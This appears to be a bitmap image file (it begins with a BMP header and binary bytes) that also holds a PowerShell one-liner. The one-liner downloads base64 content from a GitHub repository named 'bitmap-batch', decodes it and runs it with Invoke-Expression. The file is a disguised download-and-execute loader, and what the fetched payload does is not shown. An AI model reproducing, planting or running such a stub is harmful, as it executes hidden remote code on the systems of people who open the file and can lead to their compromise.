BM2      6   (   T            �   �  �            


powershell $MYTEXT = (Invoke-WebRequest -Uri "https://github.com/Fede654/bitmap-batch/raw/main/warning_popup").Content;$DECODED = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($MYTEXT));Invoke-Expression $DECODED
 